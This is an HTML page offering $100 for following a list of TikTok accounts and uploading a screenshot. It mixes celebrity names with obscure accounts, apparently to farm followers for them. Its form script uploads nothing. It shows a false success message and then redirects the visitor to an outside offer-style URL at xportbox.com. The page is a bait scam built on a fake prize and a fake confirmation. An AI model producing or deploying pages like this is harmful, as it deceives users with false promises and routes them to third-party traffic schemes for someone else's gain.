<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Follow Celebrities and Win $100</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha384-k6RqeWeci5ZR/Lv4MR0sA0FfDOMjP7c3u56G9Jf6x5hQV8/JkNxe83Xyb42h8p" crossorigin="anonymous"> 
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #00f;
            text-align: center;
            padding: 20px;
            margin: 0;
        }
        h1 {
            color: #ffcc00;
            margin-bottom: 20px;
        }
        .celebrity-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 15px auto;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            max-width: 500px; /* Limit width for cleaner layout */
            transition: background 0.3s;
        }
        .celebrity-item:hover {
            background: rgba(255, 255, 255, 0.2);
        }
        .celebrity-item span {
            font-size: 18px;
            color: #00f;
            flex-grow: 1;
            text-align: left;
            padding-left: 10px;
        }
        .follow-button {
            background: linear-gradient(90deg, #ff6f00, #ff0000);
            color: #fff;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            text-decoration: none;
            border-radius: 50px;
            display: flex;
            align-items: center;
            transition: box-shadow 0.3s, transform 0.3s;
            box-shadow: 0px 4px 15px rgba(255, 0, 0, 0.4);
        }
        .follow-button i {
            margin-right: 8px;
        }
        .follow-button:hover {
            box-shadow: 0px 8px 20px rgba(255, 0, 0, 0.6);
            transform: scale(1.05);
        }
        #submissionForm {
            margin-top: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 20px;
            max-width: 500px;
            margin: 20px auto;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
        }
        label {
            font-size: 18px;
            display: block;
            margin-bottom: 10px;
            color: #00f;
        }
        #screenshot {
            margin-top: 10px;
            margin-bottom: 20px;
            padding: 5px;
        }
        .submit-button {
            background-color: #00f;
            color: #fff;
            border: none;
            padding: 10px 15px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s;
        }
        .submit-button:hover {
            background-color: #0056b3;
        }
        @media (max-width: 600px) {
            .celebrity-item {
                flex-direction: column;
                align-items: center;
            }
            .celebrity-item span {
                text-align: center;
                padding-left: 0;
                margin-bottom: 10px;
            }
        }
    </style>
</head>
<body>
    <h1>Follow These Celebrities and Win $100!</h1>
    <p>Follow the celebrities listed below:</p>

    <div id="celebrity-list">
        <div class="celebrity-item">
            <span>Dwayne Johnson</span>
            <a href="https://www.tiktok.com/@therock" target="_blank" class="follow-button">
                <i class="fab fa-tiktok"></i> Follow
            </a>
        </div>
        <div class="celebrity-item">
            <span>Keithubarnonlyfanspage</span>
            <a href="https://www.tiktok.com/@keithubarnonlyfanspage" target="_blank" class="follow-button">
                <i class="fab fa-tiktok"></i> Follow
            </a>
        </div>
        <div class="celebrity-item">
            <span>Will Smith</span>
            <a href="https://www.tiktok.com/@willsmith" target="_blank" class="follow-button">
                <i class="fab fa-tiktok"></i> Follow
            </a>
        </div>
        <div class="celebrity-item">
            <span>Calebosky1</span>
            <a href="https://www.tiktok.com/@calebosky1" target="_blank" class="follow-button">
                <i class="fab fa-tiktok"></i> Follow
            </a>
        </div>
        <div class="celebrity-item">
            <span>Davido</span>
            <a href="https://www.tiktok.com/@davido" target="_blank" class="follow-button">
                <i class="fab fa-tiktok"></i> Follow
            </a>
        </div>
        <div class="celebrity-item">
            <span>Selena Gomez</span>
            <a href="https://www.tiktok.com/@selenagomez" target="_blank" class="follow-button">
                <i class="fab fa-tiktok"></i> Follow
            </a>
        </div>
        <div class="celebrity-item">
            <span>Zoe Sugg</span>
            <a href="https://www.tiktok.com/@zoesugg" target="_blank" class="follow-button">
                <i class="fab fa-tiktok"></i> Follow
            </a>
        </div>
    </div>

    <form id="submissionForm">
        <label for="screenshot">Upload your screenshot:</label>
        <input type="file" id="screenshot" name="screenshot" accept="image/*" required>
        <button type="submit" class="submit-button">Submit</button>
    </form>

    <script>
        document.getElementById("submissionForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent the default form submission
            alert("Screenshot submitted successfully!"); // Notify the user
            window.location.href = "http://xportbox.com/XU/VI?nox=7277082848"; // Redirect to specified URL
        });
    </script>
</body>
</html>
